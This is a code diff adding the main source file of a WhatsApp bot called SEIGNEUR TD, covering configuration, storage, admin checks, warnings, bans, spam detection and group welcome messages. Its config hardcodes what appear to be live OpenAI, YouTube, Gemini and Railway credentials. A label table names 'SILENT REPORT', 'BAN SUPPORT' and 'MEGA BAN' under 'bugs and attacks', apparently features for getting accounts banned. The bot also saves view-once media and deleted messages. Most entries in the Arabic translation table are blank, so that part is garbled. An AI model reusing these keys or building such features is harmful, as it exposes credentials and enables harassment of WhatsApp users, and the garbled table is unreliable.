@@ -1,0 +1,9965 @@
+import { createServer } from 'http';
+import { fork } from 'child_process';
+import makeWASocket, {
+  DisconnectReason,
+  useMultiFileAuthState,
+  fetchLatestBaileysVersion,
+  delay,
+  downloadContentFromMessage
+} from 'bail-lite';
+
+import qrcode from 'qrcode-terminal';
+import pino from 'pino';
+import fs from 'fs';
+import path from 'path';
+import axios from 'axios';
+import * as cheerio from 'cheerio';
+
+// Bot configuration
+const config = {
+  botName: 'SEIGNEUR TD',
+  prefix: '.',
+  language: 'ar', // 'ar' = Arabe, 'fr' = Français, 'en' = English
+  autoReply: false,
+  sessionFolder: './auth_info_baileys',
+  usePairingCode: true,
+  phoneNumber: '', // Laissé vide — saisi au démarrage
+  adminNumbers: ['84933801806', '107658338123943'], // Admins
+  railwayToken: process.env.RAILWAY_TOKEN || '96bac1f1-b737-4cb0-b8c7-d8af5a4a0b0a',
+  botAdmins: ['84933801806', '107658338123943'], // Liste des numéros admin (sans @s.whatsapp.net)
+  dataFolder: './bot_data',
+  maxViewOncePerUser: 50,
+  commandCooldown: 2000, // 2 secondes entre les commandes
+  youtubeApiKey: 'AIzaSyD3JA07YzY6SJSHKtj9IA7S-GFZUkqYd70', // 🔑 Clé API YouTube Data v3
+  openaiApiKey:  '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', // 🔑 Clé API OpenAI GPT
+  geminiApiKey:  'AIzaSyAj5kNv4ClFt-4DskW6XDU0PIPd3PXmwCw',  // 🔑 Clé API Google Gemini
+  groqApiKey:    '',  // 🔑 Clé API Groq (optionnel, gratuit sur console.groq.com)
+  channelLink:   'https://whatsapp.com/channel/0029Vb7mdO3KAwEeztGPQr3U',  // 📢 Chaîne WhatsApp
+  channelJid:    '120363409145514813@newsletter'
+};
+
+// Créer le dossier de données s'il n'existe pas
+if (!fs.existsSync(config.dataFolder)) {
+  fs.mkdirSync(config.dataFolder, { recursive: true });
+}
+
+// =============================================
+// SYSTÈME DE TRADUCTION ARABE
+// =============================================
+
+const translations = {
+  // Messages communs
+  ' ': ' ',
+  'This command is for groups only': ' for groups only',
+  'Admin command': '  ',
+  'Usage': '',
+  'Exemple': '',
+  '': '',
+  '': '',
+  'Failed': '',
+  ' ': ' ',
+  ' ': ' ',
+  '': '',
+  'Target': '',
+  'Status': '',
+  
+  // Commandes principales
+  'Menu': '',
+  'Help': '',
+  'Ping': '',
+  'Alive': '',
+  'Info': '',
+  'Status': '',
+  
+  // Messages du menu
+  'User': '',
+  'Dev': '',
+  'Developer': '',
+  'Region': '',
+  'Date': '',
+  'Time': '',
+  'Mode': '',
+  'Version': '',
+  'Prefix': '',
+  'Bot Name': ' ',
+  
+  // Commandes de groupe
+  'Group': '',
+  'Members': '',
+  'Admins': '',
+  'Online': '',
+  'Offline': ' ',
+  'Kicked': ' ',
+  'Added': ' ',
+  'Promoted': ' ',
+  'Demoted': ' ',
+  
+  // Messages d'erreur
+  'No media found': '    ',
+  'Reply to a message': '  ',
+  ' ': '  ',
+  'Invalid number': '  ',
+  'Command not found': '  ',
+  
+  // Bugs et attaques
+  'SILENT REPORT': ' ',
+  'BAN SUPPORT': ' ',
+  'MEGA BAN': ' ',
+  
+  // États
+  ' ': ' ',
+  ' ': ' ',
+  ' ': ' ',
+  '': '',
+  ' ': ' ',
+  '': '',
+  ' ': ' ',
+  '': '',
+  '': '',
+  
+  // Autres
+  '': '',
+  'Reports': '',
+  'Total': '',
+  'Duration': '',
+  'Speed': '',
+  'Risk': '',
+  'Timeline': ' ',
+  'Details': '',
+  'System Status': ' ',
+  '  ': '  ',
+  'Mission accomplished': ' '
+};
+
+// Fonction de traduction
+function translate(text) {
+  if (config.language !== 'ar') return text;
+  
+  // Traduire les mots clés
+  let translatedText = text;
+  for (const [key, value] of Object.entries(translations)) {
+    const regex = new RegExp(key, 'gi');
+    translatedText = translatedText.replace(regex, value);
+  }
+  
+  return translatedText;
+}
+
+// Fonction pour envelopper les messages en arabe
+function msg(text) {
+  return translate(text);
+}
+
+// Auto-reply keywords and responses
+const autoReplies = {
+  'hello': '👋 Salut! Je suis SEIGNEUR TD. Comment puis-je t\'aider?',
+  'hi': '👋 Hello! Bienvenue sur SEIGNEUR TD.',
+  'help': `╔══════════════════════════════╗
+║      SEIGNEUR TD         ║
+╚══════════════════════════════╝
+
+📋 Commandes disponibles:
+━━━━━━━━━━━━━━━━
+!help - Afficher ce menu
+!ping - Vérifier la latence
+!info - Informations du bot
+!menu - Menu principal
+
+Type !menu pour voir le menu complet!`,
+  'bye': '👋 À bientôt! Prends soin de toi!',
+  'thanks': 'De rien! 😊 - SEIGNEUR TD',
+  'thank you': 'Avec plaisir! 😊 - SEIGNEUR TD'
+};
+
+// Simple in-memory database with persistence
+const database = {
+  users: new Map(),
+  groups: new Map(),
+  statistics: {
+    total: 0,
+    totalUsers: 0,
+    totalGroups: 0
+  }
+};
+
+// Variables pour les fonctionnalités
+let botMode = 'public';
+let autoTyping = false;
+let autoRecording = true;
+let autoReact = true;
+let autoReadStatus = true;
+let autoLikeStatus = true;
+let antiDelete = true;
+let antiEdit = true;
+let antiBug = true;         // 🛡️ Protection anti-bug activée
+let antiDeleteMode = 'all'; // 'private' | 'gchat' | 'all'
+let pairingRequested = false; // Global - évite retry après reconnect
+let antiEditMode = 'all';   // 'private' | 'gchat' | 'all'
+let chatbotEnabled = false; // 🤖 Chatbot Dostoevsky OFF par défaut
+let stickerPackname = 'SEIGNEUR TD'; // 📦 Nom du pack sticker
+let stickerAuthor = '© DEV DOSTOEVSKY TECHX'; // ✍️ Auteur du sticker
+let menuStyle = 1; // 🎨 Style de menu (1, 2, 3)
+let savedViewOnce = new Map();
+let messageCache = new Map();
+let groupSettings = new Map();
+let memberActivity = new Map();
+
+const antiBugTracker = new Map(); // { senderJid: { count, lastSeen, blocked } }
+
+let autoreactWords = {
+  'good': '👍', 'nice': '👌', 'wow': '😲',
+  'lol': '😂', 'cool': '😎', 'love': '❤️',
+  'fire': '🔥', 'sad': '😢', 'angry': '😠', 'ok': '👌'
+};
+
+const warnSystem = new Map();
+const spamTracker = new Map();
+const permaBanList = new Map();
+const commandCooldowns = new Map();
+
+// =============================================
+// 🗄️ STORE LOCAL - SYSTÈME DE PERSISTANCE COMPLET
+// =============================================
+
+const STORE_DIR = './store';
+const STORE_FILES = {
+  config:       `${STORE_DIR}/config.json`,
+  admins:       `${STORE_DIR}/admins.json`,
+  warns:        `${STORE_DIR}/warns.json`,
+  permabans:    `${STORE_DIR}/permabans.json`,
+  groupSettings:`${STORE_DIR}/group_settings.json`,
+  stats:        `${STORE_DIR}/stats.json`,
+  viewonce:     `${STORE_DIR}/viewonce.json`,
+  activity:     `${STORE_DIR}/activity.json`,
+  antilink:     `${STORE_DIR}/antilink.json`,
+  antibot:      `${STORE_DIR}/antibot.json`,
+  antitag:      `${STORE_DIR}/antitag.json`,
+  antispam:     `${STORE_DIR}/antispam.json`,
+  welcome:      `${STORE_DIR}/welcome.json`,
+  autoreact:    `${STORE_DIR}/autoreact.json`,
+};
+
+// --- Utilitaires Store ---
+function storeEnsureDir() {
+  if (!fs.existsSync(STORE_DIR)) {
+    fs.mkdirSync(STORE_DIR, { recursive: true });
+    console.log('📁 Store directory created:', STORE_DIR);
+  }
+  // Créer aussi le dossier legacy pour compatibilité
+  if (!fs.existsSync(config.dataFolder)) {
+    fs.mkdirSync(config.dataFolder, { recursive: true });
+  }
+}
+
+function storeRead(file, defaultValue = {}) {
+  try {
+    if (fs.existsSync(file)) {
+      const raw = fs.readFileSync(file, 'utf8');
+      return JSON.parse(raw);
+    }
+  } catch (e) {
+    console.error(`⚠️ Store read error [${file}]:`, e.message);
+  }
+  return defaultValue;
+}
+
+function storeWrite(file, data) {
+  try {
+    storeEnsureDir();
+    fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
+    return true;
+  } catch (e) {
+    console.error(`⚠️ Store write error [${file}]:`, e.message);
+    return false;
+  }
+}
+
+function mapToObj(map) {
+  const obj = {};
+  for (const [k, v] of map.entries()) obj[k] = v;
+  return obj;
+}
+
+function objToMap(obj) {
+  return new Map(Object.entries(obj || {}));
+}
+
+// --- LOAD STORE (au démarrage) ---
+function loadStore() {
+  storeEnsureDir();
+
+  // 1. CONFIG (botMode, toggles)
+  const savedConfig = storeRead(STORE_FILES.config);
+  if (Object.keys(savedConfig).length) {
+    botMode        = savedConfig.botMode        ?? 'public';
+    autoTyping     = savedConfig.autoTyping     ?? false;
+    autoRecording  = savedConfig.autoRecording  ?? true;
+    autoReact      = savedConfig.autoReact      ?? true;
+    autoReadStatus = savedConfig.autoReadStatus ?? true;
+    autoLikeStatus = savedConfig.autoLikeStatus ?? true;
+    antiDelete     = savedConfig.antiDelete     ?? true;
+    antiEdit       = savedConfig.antiEdit       ?? true;
+    antiBug        = savedConfig.antiBug        ?? true;
+    chatbotEnabled = savedConfig.chatbotEnabled ?? false;
+    autoreactWords = savedConfig.autoreactWords ?? autoreactWords;
+    stickerPackname = savedConfig.stickerPackname ?? 'SEIGNEUR TD';
+    stickerAuthor   = savedConfig.stickerAuthor   ?? '© DEV DOSTOEVSKY TECHX';
+    menuStyle       = savedConfig.menuStyle        ?? 1;
+    console.log('✅ [STORE] Config chargée');
+  }
+
+  // 2. ADMINS (botAdmins + adminNumbers)
+  const savedAdmins = storeRead(STORE_FILES.admins);
+  if (savedAdmins.botAdmins?.length) {
+    // ✅ Filtrer les entrées vides/invalides du store
+    const filteredBotAdmins = savedAdmins.botAdmins.filter(a => a && String(a).replace(/[^0-9]/g,'').length > 5);
+    const filteredAdminNumbers = (savedAdmins.adminNumbers || []).filter(a => a && String(a).replace(/[^0-9]/g,'').length > 5);
+    // ✅ Toujours garder le owner principal même si le store est corrompu
+    const ownerNum = config.adminNumbers[0];
+    if (!filteredBotAdmins.includes(ownerNum)) filteredBotAdmins.unshift(ownerNum);
+    if (!filteredAdminNumbers.includes(ownerNum)) filteredAdminNumbers.unshift(ownerNum);
+    config.botAdmins    = filteredBotAdmins;
+    config.adminNumbers = filteredAdminNumbers;
+    console.log(`✅ [STORE] Admins chargés: ${config.botAdmins.length} admin(s)`);
+  }
+
+  // 3. WARNS
+  const savedWarns = storeRead(STORE_FILES.warns);
+  for (const [k, v] of Object.entries(savedWarns)) warnSystem.set(k, v);
+  if (Object.keys(savedWarns).length) console.log('✅ [STORE] Warnings chargés');
+
+  // 4. PERMABANS
+  const savedBans = storeRead(STORE_FILES.permabans);
+  for (const [k, v] of Object.entries(savedBans)) permaBanList.set(k, v);
+  if (Object.keys(savedBans).length) console.log('✅ [STORE] Permabans chargés');
+
+  // 5. GROUP SETTINGS
+  const savedGroups = storeRead(STORE_FILES.groupSettings);
+  for (const [k, v] of Object.entries(savedGroups)) groupSettings.set(k, v);
+  if (Object.keys(savedGroups).length) console.log('✅ [STORE] Paramètres groupes chargés');
+
+  // 6. STATS
+  const savedStats = storeRead(STORE_FILES.stats);
+  if (Object.keys(savedStats).length) {
+    Object.assign(database.statistics, savedStats);
+    console.log('✅ [STORE] Statistiques chargées');
+  }
+
+  // 7. VIEW ONCE
+  const savedVV = storeRead(STORE_FILES.viewonce);
+  for (const [k, v] of Object.entries(savedVV)) {
+    try {
+      savedViewOnce.set(k, v.map(item => ({
+        ...item,
+        buffer: Buffer.from(item.buffer, 'base64')
+      })));
+    } catch(e) {}
+  }
+  if (Object.keys(savedVV).length) console.log('✅ [STORE] View Once chargé');
+
+  // 8. ACTIVITY
+  const savedActivity = storeRead(STORE_FILES.activity);
+  for (const [groupJid, members] of Object.entries(savedActivity)) {
+    memberActivity.set(groupJid, objToMap(members));
+  }
+  if (Object.keys(savedActivity).length) console.log('✅ [STORE] Activité chargée');
+
+  console.log('🗄️ [STORE] Loading complet!');
+}
+
+// --- SAVE STORE (complet) ---
+function saveStore() {
+  storeEnsureDir();
+
+  // 1. CONFIG
+  storeWrite(STORE_FILES.config, {
+    botMode, autoTyping, autoRecording, autoReact,
+    autoReadStatus, autoLikeStatus, antiDelete, antiEdit, antiBug, chatbotEnabled, autoreactWords,
+    stickerPackname, stickerAuthor, menuStyle,
+    savedAt: new Date().toISOString()
+  });
+
+  // 2. ADMINS
+  storeWrite(STORE_FILES.admins, {
+    botAdmins: config.botAdmins,
+    adminNumbers: config.adminNumbers,
+    savedAt: new Date().toISOString()
+  });
+
+  // 3. WARNS
+  storeWrite(STORE_FILES.warns, mapToObj(warnSystem));
+
+  // 4. PERMABANS
+  storeWrite(STORE_FILES.permabans, mapToObj(permaBanList));
+
+  // 5. GROUP SETTINGS
+  storeWrite(STORE_FILES.groupSettings, mapToObj(groupSettings));
+
+  // 6. STATS
+  storeWrite(STORE_FILES.stats, {
+    ...database.statistics,
+    savedAt: new Date().toISOString()
+  });
+
+  // 7. VIEW ONCE
+  const vvData = {};
+  for (const [k, v] of savedViewOnce.entries()) {
+    try {
+      vvData[k] = v.map(item => ({
+        ...item,
+        buffer: Buffer.isBuffer(item.buffer) ? item.buffer.toString('base64') : item.buffer
+      }));
+    } catch(e) {}
+  }
+  storeWrite(STORE_FILES.viewonce, vvData);
+
+  // 8. ACTIVITY
+  const activityData = {};
+  for (const [groupJid, membersMap] of memberActivity.entries()) {
+    activityData[groupJid] = mapToObj(membersMap);
+  }
+  storeWrite(STORE_FILES.activity, activityData);
+}
+
+// --- SAVE PARTIEL (une seule clé) ---
+function saveStoreKey(key) {
+  switch(key) {
+    case 'config':
+      storeWrite(STORE_FILES.config, {
+        botMode, autoTyping, autoRecording, autoReact,
+        autoReadStatus, autoLikeStatus, antiDelete, antiEdit, autoreactWords,
+        savedAt: new Date().toISOString()
+      });
+      break;
+    case 'admins':
+      storeWrite(STORE_FILES.admins, {
+        botAdmins: config.botAdmins,
+        adminNumbers: config.adminNumbers,
+        savedAt: new Date().toISOString()
+      });
+      break;
+    case 'warns':
+      storeWrite(STORE_FILES.warns, mapToObj(warnSystem));
+      break;
+    case 'permabans':
+      storeWrite(STORE_FILES.permabans, mapToObj(permaBanList));
+      break;
+    case 'groupSettings':
+      storeWrite(STORE_FILES.groupSettings, mapToObj(groupSettings));
+      break;
+    case 'stats':
+      storeWrite(STORE_FILES.stats, { ...database.statistics, savedAt: new Date().toISOString() });
+      break;
+    case 'viewonce':
+      const vvData = {};
+      for (const [k, v] of savedViewOnce.entries()) {
+        try {
+          vvData[k] = v.map(item => ({
+            ...item,
+            buffer: Buffer.isBuffer(item.buffer) ? item.buffer.toString('base64') : item.buffer
+          }));
+        } catch(e) {}
+      }
+      storeWrite(STORE_FILES.viewonce, vvData);
+      break;
+    case 'activity':
+      const actData = {};
+      for (const [g, m] of memberActivity.entries()) actData[g] = mapToObj(m);
+      storeWrite(STORE_FILES.activity, actData);
+      break;
+  }
+}
+
+// --- STORE STATUS (pour !storestatus) ---
+function getStoreStatus() {
+  const files = [];
+  let totalSize = 0;
+  for (const [key, filePath] of Object.entries(STORE_FILES)) {
+    if (fs.existsSync(filePath)) {
+      const stat = fs.statSync(filePath);
+      const sizeKB = (stat.size / 1024).toFixed(2);
+      totalSize += stat.size;
+      files.push({ key, sizeKB, modified: stat.mtime.toLocaleTimeString('ar-SA') });
+    } else {
+      files.push({ key, sizeKB: '0.00', modified: '  ' });
+    }
+  }
+  return { files, totalSizeKB: (totalSize / 1024).toFixed(2) };
+}
+
+// Auto-save toutes les 3 minutes
+setInterval(() => {
+  saveStore();
+  console.log('💾 [STORE] Auto-save effectué');
+}, 3 * 60 * 1000);
+
+// Compatibilité with les anciens appels loadData/saveData
+function loadData() { loadStore(); }
+function saveData() { saveStore(); }
+
+
+// =============================================
+// UTILITAIRES
+// =============================================
+
+// ─── HELPER: Audio thème du bot (fichier local menu.mp3) ────────────────────
+// Envoie menu.mp3 avec le même format que !playaudio
+async function sendCmdAudio(sock, remoteJid) {
+  try {
+    const audioExts = ['.mp3', '.ogg', '.wav', '.m4a'];
+    for (const ext of audioExts) {
+      const filePath = `./menu${ext}`;
+      if (fs.existsSync(filePath)) {
+        const audioBuf = fs.readFileSync(filePath);
+        const mimetype = ext === '.ogg' ? 'audio/ogg; codecs=opus' : 'audio/mpeg';
+        
+        // Envoyer juste l'audio sans message YouTube
+        await sock.sendMessage(remoteJid, {
+          audio:    audioBuf,
+          mimetype: mimetype,
+          fileName: `menu${ext}`
+        });
+        
+        console.log(`[sendCmdAudio] ✅ Audio envoyé: ${filePath}`);
+        return true;
+      }
+    }
+    return false;
+  } catch(e) {
+    console.error('[sendCmdAudio]', e.message);
+    return false;
+  }
+}
+
+
+// ─── HELPER: Ajouter footer chaîne après les réponses ────────────────────────
+async function sendWithChannelFooter(sock, remoteJid, text, options = {}) {
+  const footerText = text + `\n\n📢 *Rejoins notre chaîne:* ${config.channelLink}`;
+  await sock.sendMessage(remoteJid, { text: footerText, ...options });
+}
+
+// ═══ Helper: Envoyer réponse + lien chaîne + audio ═══════════════════════════
+
+
+async function toBuffer(stream) {
+  const chunks = [];
+  for await (const chunk of stream) {
+    chunks.push(chunk);
+  }
+  return Buffer.concat(chunks);
+}
+
+function isAdmin(jid) {
+  if (!jid) return false;
+  const p = jid.split(':')[0].split('@')[0].replace(/[^0-9]/g,'');
+  
+  // ✅ Vérifie si c'est le bot lui-même (owner) via globalBotJid
+  if (global.botLidJid && (jid === global.botLidJid || jid.split(':')[0] === global.botLidJid.split(':')[0])) return true;
+  if (global.botOwnerLid && (jid === global.botOwnerLid || jid.split(':')[0] === global.botOwnerLid.split(':')[0])) return true;
+  
+  if (!p) return false;
+  // ✅ Vérifie adminNumbers (ignore les entrées vides)
+  if(config.adminNumbers.some(a=>{
+    const pa = String(a).replace(/[^0-9]/g,'');
+    return pa && p === pa;
+  })) return true;
+  // ✅ Vérifie botAdmins (ignore les entrées vides)
+  return (config.botAdmins||[]).some(num => {
+    const pa = String(num).replace(/[^0-9]/g,'');
+    return pa && p === pa;
+  });
+}
+
+// Vérifier si un utilisateur est admin du groupe
+async function isGroupAdmin(sock, groupJid, userJid) {
+  try {
+    // Le numéro du bot est TOUJOURS admin
+    const botJid = sock.user.id.split(':')[0];
+    const normalizedUserJid = userJid.split(':')[0];
+    
+    if (normalizedUserJid === botJid) {
+      return true; // Le bot est toujours admin
+    }
+    
+    const metadata = await sock.groupMetadata(groupJid);
+    const participant = metadata.participants.find(p => {
+      const normalizedPJid = p.id.split(':')[0];
+      return normalizedPJid === normalizedUserJid;
+    });
+    return participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
+  } catch (error) {
+    console.error(' checking group admin:', error);
+    return false;
+  }
+}
+
+// Vérifier si le bot est admin du groupe
+async function isBotGroupAdmin(sock, groupJid) {
+  // LE BOT EST TOUJOURS ADMIN - Retourne toujours true
+  return true;
+  
+  /* Code original commenté - Le bot n'a plus besoin d'être réellement admin
+  try {
+    const metadata = await sock.groupMetadata(groupJid);
+    const botJid = sock.user.id.split(':')[0];
+    const participant = metadata.participants.find(p => p.id.split(':')[0] === botJid);
+    return participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
+  } catch (error) {
+    console.error(' checking bot admin:', error);
+    return false;
+  }
+  */
+}
+
+function checkCooldown(userId, commandName) {
+  const key = `${userId}-${commandName}`;
+  const now = Date.now();
+  
+  if (commandCooldowns.has(key)) {
+    const lastUse = commandCooldowns.get(key);
+    if (now - lastUse < config.commandCooldown) {
+      return false;
+    }
+  }
+  
+  commandCooldowns.set(key, now);
+  return true;
+}
+
+async function simulateTyping(sock, jid, duration = 3000) {
+  if (!autoTyping) return;
+  try {
+    await sock.sendPresenceUpdate('composing', jid);
+    setTimeout(async () => {
+      try { await sock.sendPresenceUpdate('available', jid); } catch(e) {}
+    }, duration);
+  } catch(e) {
+    console.error('Autotype error:', e.message);
+  }
+}
+
+async function simulateRecording(sock, jid, duration = 2000) {
+  if (!autoRecording) return;
+  try {
+    await sock.sendPresenceUpdate('recording', jid);
+    setTimeout(async () => {
+      try { await sock.sendPresenceUpdate('available', jid); } catch(e) {}
+    }, duration);
+  } catch(e) {
+    console.error('Autorecord error:', e.message);
+  }
+}
+
+// Initialiser les paramètres d'un groupe
+function initGroupSettings(groupJid) {
+  if (!groupSettings.has(groupJid)) {
+    groupSettings.set(groupJid, {
+      antilink: false,
+      antibot: false,
+      antitag: false,
+      antispam: false,
+      maxWarns: 3
+    });
+    saveStoreKey('groupSettings'); // 💾 Sauvegarde partielle
+  }
+  return groupSettings.get(groupJid);
+}
+
+// =============================================
+// SYSTÈME D'AVERTISSEMENTS
+// =============================================
+
+function addWarn(groupJid, userJid, reason) {
+  const key = `${groupJid}-${userJid}`;
+  if (!warnSystem.has(key)) {
+    warnSystem.set(key, []);
+  }
+  
+  const warns = warnSystem.get(key);
+  warns.push({
+    reason: reason,
+    timestamp: Date.now()
+  });
+  
+  saveStoreKey('warns'); // 💾 Sauvegarde partielle immédiate
+  return warns.length;
+}
+
+function getWarns(groupJid, userJid) {
+  const key = `${groupJid}-${userJid}`;
+  return warnSystem.get(key) || [];
+}
+
+function resetWarns(groupJid, userJid) {
+  const key = `${groupJid}-${userJid}`;
+  warnSystem.delete(key);
+  saveStoreKey('warns'); // 💾 Sauvegarde partielle immédiate
+}
+
+// =============================================
+// SYSTÈME DE PERMABAN
+// =============================================
+
+function addPermaBan(groupJid, userJid, reason, bannedBy) {
+  const key = `${groupJid}-${userJid}`;
+  permaBanList.set(key, {
+    userJid: userJid,
+    groupJid: groupJid,
+    reason: reason,
+    bannedBy: bannedBy,
+    timestamp: Date.now()
+  });
+  saveStoreKey('permabans'); // 💾 Sauvegarde partielle immédiate
+}
+
+function isPermaBanned(groupJid, userJid) {
+  const key = `${groupJid}-${userJid}`;
+  return permaBanList.has(key);
+}
+
+function removePermaBan(groupJid, userJid) {
+  const key = `${groupJid}-${userJid}`;
+  permaBanList.delete(key);
+  saveData();
+}
+
+function getPermaBanInfo(groupJid, userJid) {
+  const key = `${groupJid}-${userJid}`;
+  return permaBanList.get(key);
+}
+
+function getAllPermaBans(groupJid) {
+  const bans = [];
+  for (const [key, value] of permaBanList.entries()) {
+    if (value.groupJid === groupJid) {
+      bans.push(value);
+    }
+  }
+  return bans;
+}
+
+// =============================================
+// DÉTECTION ANTI- 
+// =============================================
+
+function checkSpam(userJid, message) {
+  const now = Date.now();
+  const key = userJid;
+  
+  if (!spamTracker.has(key)) {
+    spamTracker.set(key, []);
+  }
+  
+  const userMessages = spamTracker.get(key);
+  const recentMessages = userMessages.filter(msg => now - msg.time < 5000);
+  recentMessages.push({ time: now, text: message });
+  spamTracker.set(key, recentMessages);
+  
+  if (recentMessages.length > 5) {
+    return true;
+  }
+  
+  const textCounts = {};
+  recentMessages.forEach(msg => {
+    textCounts[msg.text] = (textCounts[msg.text] || 0) + 1;
+  });
+  
+  if (Object.values(textCounts).some(count => count >= 3)) {
+    return true;
+  }
+  
+  return false;
+}
+
+// Fonction pour obtenir la région à partir du timezone
+function getRegionFromTimezone() {
+  // Toujours retourner Port-au-Prince, Haïti
+  return 'Port-au-Prince, Haïti ';
+}
+
+// Fonction pour initialiser/obtenir les paramètres d'un groupe
+function getGroupSettings(groupJid) {
+  if (!groupSettings.has(groupJid)) {
+    groupSettings.set(groupJid, {
+      welcome: false,
+      goodbye: false
+    });
+  }
+  return groupSettings.get(groupJid);
+}
+
+// Fonction pour envoyer le message de bienvenue
+async function sendWelcomeMessage(sock, groupJid, newMemberJid) {
+  try {
+    const metadata = await sock.groupMetadata(groupJid);
+    const groupName = metadata.subject;
+    const memberCount = metadata.participants.length;
+    
+    // Trouver le superadmin (créateur du groupe)
+    const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
+    
+    // Liste des admins
+    const admins = metadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
+    let adminList = '';
+    admins.forEach((admin, index) => {
+      if (admin.id !== superadmin) {
+        adminList += `└─ ${index + 1}. @${admin.id.split('@')[0]}\n`;
+      }
+    });
+    if (!adminList) adminList = '└─ Aucun admin supplémentaire';
+    
+    // Date et heure (timezone Haïti)
+    const now = new Date();
+    const dateStr = now.toLocaleDateString('fr-FR', {
+      timeZone: 'America/Port-au-Prince',
+      day: '2-digit',
+      month: '2-digit',
+      year: 'numeric'
+    });
+    const timeStr = now.toLocaleTimeString('fr-FR', {
+      timeZone: 'America/Port-au-Prince',
+      hour: '2-digit',
+      minute: '2-digit'
+    });
+    
+    const welcomeText = ` ┏━━━━━ ✨ ᴡᴇʟᴄᴏᴍᴇ ✨ ━━━━━┓
+👤 𝐍𝐎𝐔𝐕𝐄𝐀𝐔 𝐌𝐄𝐌𝐁𝐑𝐄 : @${newMemberJid.split('@')[0]}
+👋 Bienvenue parmi nous !
+
+◈ 𝖦𝗋𝗈𝗎𝗉𝖾 : ${groupName}
+◈ 𝖬𝖾𝗆𝖻𝗋𝖾𝗌 : ${memberCount}
+
+📅 𝖣𝖺𝗍𝖾 : ${dateStr}
+🕙 𝖧𝖾𝗎𝗋𝖾 : ${timeStr}
+┗━━━━━━━━━━━━━━━━━━━━━━┛
+
+👑 𝗦𝗨𝗣𝗘𝗥𝗔𝗗𝗠𝗜𝗡 (𝖢𝗋𝖾́𝖺𝗍𝖾𝗎𝗋) :
+└─ @${superadmin.split('@')[0]}
+
+👮‍♂️ 𝗟𝗜𝗦𝗧𝗘 𝗗𝗘𝗦 𝗔𝗗𝗠𝗜𝗡𝗦 :
+${adminList}
+
+📜 𝗥𝗘̀𝗚𝗟𝗘𝗦 𝗗𝗨 𝗚𝗥𝗢𝗨𝗣𝗘 :
+𝖯𝗈𝗎𝗋 𝗀𝖺𝗋𝖽𝖾𝗋 𝗎𝗇𝖾 𝖺𝗆𝖻𝗂𝖺𝗇𝖼𝖾 𝗌𝖺𝗂𝗇𝖾 :
+⛔ 𝟏. 𝖯𝖺𝗌 𝖽𝖾 𝖲𝗉𝖺𝗆
+⚠️ 𝟐. 𝖯𝖺𝗌 𝖽𝖾 𝖯𝗎𝖻 / 𝖫𝗂𝖾𝗇𝗌
+🤝 𝟑. 𝖱𝖾𝗌𝗉𝖾𝖼𝗍 𝖬𝗎𝗍𝗎𝖾𝗅
+🔞 𝟒. 𝖢𝗈𝗇𝗍𝖾𝗇𝗎 𝖠𝗉𝗉𝗋𝗈𝗉𝗋𝗂𝖾́
+
+💡 𝘓𝘦 𝘯𝘰𝘯-𝘳𝘦𝘴𝘱𝘦𝘤𝘵 𝘥𝘦𝘴 𝘳𝘦̀𝘨𝘭𝘦𝘴 𝘱𝘦𝘶𝘵
+𝘦𝘯𝘵𝘳𝘢𝘪̂𝘯𝘦𝘳 𝘶𝘯 𝘣𝘢𝘯𝘯𝘪𝘴𝘴𝘦𝘮𝘦𝘯𝘵.
+
+✨ 𝖯𝗋𝗈𝖿𝗂𝗍𝖾 𝖻𝗂𝖾𝗇 𝖽𝖾 𝗅𝖺 𝖼𝗈𝗆𝗆𝗎𝗇𝖺𝗎𝗍𝖾́ !
+━━━━━━━━━━━━━━━━━━━━━`;
+
+    const mentions = [newMemberJid, superadmin, ...admins.map(a => a.id)];
+    
+    await sock.sendMessage(groupJid, {
+      text: welcomeText,
+      mentions: mentions
+    });
+    
+    console.log(`✅ Message de bienvenue envoyé à ${newMemberJid.split('@')[0]}`);
+  } catch (error) {
+    console.error(' in sendWelcome:', error);
+  }
+}
+
+// Fonction pour envoyer le message d'au revoir
+async function sendGoodbyeMessage(sock, groupJid, leftMemberJid) {
+  try {
+    const metadata = await sock.groupMetadata(groupJid);
+    const groupName = metadata.subject;
+    const memberCount = metadata.participants.length;
+    
+    // Trouver le superadmin
+    const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
+    
+    // Liste des admins
+    const admins = metadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
+    let adminList = '';
+    admins.forEach((admin, index) => {
+      if (admin.id !== superadmin) {
+        adminList += `└─ ${index + 1}. @${admin.id.split('@')[0]}\n`;
+      }
+    });
+    if (!adminList) adminList = '└─ Aucun admin supplémentaire';
+    
+    // Date et heure
+    const now = new Date();
+    const dateStr = now.toLocaleDateString('fr-FR', {
+      timeZone: 'America/Port-au-Prince',
+      day: '2-digit',
+      month: '2-digit',
+      year: 'numeric'
+    });
+    const timeStr = now.toLocaleTimeString('fr-FR', {
+      timeZone: 'America/Port-au-Prince',
+      hour: '2-digit',
+      minute: '2-digit'
+    });
+    
+    const goodbyeText = `┏━━━ 💨 ɢᴏᴏᴅʙʏᴇ ━━━┓
+
+  ◈ 𝖦𝗋𝗈𝗎𝗉𝖾 : ${groupName}
+  ◈ 𝖬𝖾𝗆𝖻𝗋𝖾𝗌 : ${memberCount} 
+  
+  📅 𝖣𝖺𝗍𝖾 : ${dateStr}
+  🕙 𝖧𝖾𝗎𝗋𝖾 : ${timeStr}
+
+┗━━━━━━━━━━━━━━━━━━━━┛
+
+👋 𝗨𝗡 𝗠𝗘𝗠𝗕𝗥𝗘 𝗡𝗢𝗨𝗦 𝗤𝗨𝗜𝗧𝗧𝗘 :
+└─ @${leftMemberJid.split('@')[0]}
+
+👑 𝗦𝗨𝗣𝗘𝗥𝗔𝗗𝗠𝗜𝗡 :
+└─ @${superadmin.split('@')[0]}
+
+👮‍♂️ 𝗦𝗧𝗔𝗙𝗙 𝗔𝗗𝗠𝗜𝗡𝗦 :
+${adminList}
+
+📜 𝗜𝗡𝗙𝗢 :
+𝖴𝗇𝖾 𝗉𝖾𝗋𝗌𝗈𝗇𝗇𝖾 𝖺 𝗊𝗎𝗂𝗍𝗍𝖾́ 𝗅'𝖺𝗏𝖾𝗇𝗍𝗎𝗋𝖾. 
